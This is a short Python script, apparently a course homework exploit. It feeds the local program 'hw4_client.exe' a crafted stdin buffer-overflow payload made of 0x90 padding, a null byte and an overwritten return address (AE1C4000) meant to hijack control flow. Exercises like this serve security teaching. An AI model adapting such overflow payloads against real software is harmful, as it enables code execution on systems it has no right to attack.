import socket
import sys
import subprocess
from subprocess import PIPE
from time import sleep

proc = subprocess.Popen(["hw4_client.exe"], stdin=PIPE)

desiredCode = "USER"
desiredCodeHex = str.encode(desiredCode)
proc.stdin.write(desiredCodeHex)
preMenu =  "90" * 32
postMenu = "90" * 34
#breakpoint()  # drop into the debugger at this point
first_attack = str.encode(desiredCode+"\n") + bytearray.fromhex(preMenu) + str.encode(desiredCode) + bytearray.fromhex("00") + bytearray.fromhex(postMenu) + bytearray.fromhex("AE1C4000") + str.encode("\n")
print(first_attack)
proc.stdin.write(first_attack)
#proc.stdin.flush()
#proc.write(input=first_attack)

